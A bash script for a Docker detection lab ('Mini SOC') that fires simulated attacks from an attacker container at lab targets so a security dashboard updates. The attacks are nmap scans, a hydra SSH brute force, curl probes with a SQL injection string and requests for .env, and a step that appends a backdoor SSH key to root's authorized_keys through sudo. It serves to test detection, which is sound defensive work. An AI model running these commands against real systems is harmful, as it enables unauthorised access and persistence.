#!/bin/bash
# One-command demo: fires every attack scenario against the Mini SOC lab in
# sequence, with a short pause between each so the dashboard visibly updates.
#
# Assumes: `docker compose up -d` has been run, and log-collector/parser.py,
# detection-engine/detector.py, api/main.py, and dashboard/ are each running
# in their own terminal (see README's "Running it locally"). This script
# only fires the attacks - it doesn't stand up the detection pipeline itself,
# the same way a real attack-simulation tool assumes its target is already
# deployed rather than deploying it.

set -e

step() {
    echo ""
    echo "=== $1 ==="
    sleep 2
}

echo "Bringing up the lab containers (no-op if already running)..."
docker compose up -d
sleep 2

step "SSH reconnaissance / banner grab"
docker exec attacker nmap -sV -p 22 ssh-target
docker exec attacker nmap -sV -p 22 ssh-target

step "SSH brute force"
docker exec attacker hydra -l testuser -P /attacks/passwords.txt ssh://ssh-target

step "Web attack probing (SQLi, path traversal, sensitive files)"
docker exec attacker curl -s "http://web-target/index.html?id=1%27%20OR%20%271%27%3D%271" -o /dev/null
docker exec attacker curl -s "http://web-target/.env" -o /dev/null
docker exec attacker curl -s "http://web-target/wp-login.php" -o /dev/null

step "Raw TCP port scan (invisible to auth.log, caught by packet capture)"
docker exec attacker nmap -sT -p 20-25 ssh-target

step "Privilege escalation + persistence (passwordless sudo -> backdoor SSH key)"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTRUDER attack-sh-backdoor" | \
    docker exec -i attacker sshpass -p password123 ssh -o StrictHostKeyChecking=no \
    testuser@ssh-target "sudo tee -a /root/.ssh/authorized_keys" > /dev/null

echo ""
echo "=== Done ==="
echo "Dashboard: http://localhost:5173"
echo "API:       curl http://localhost:8000/incidents"
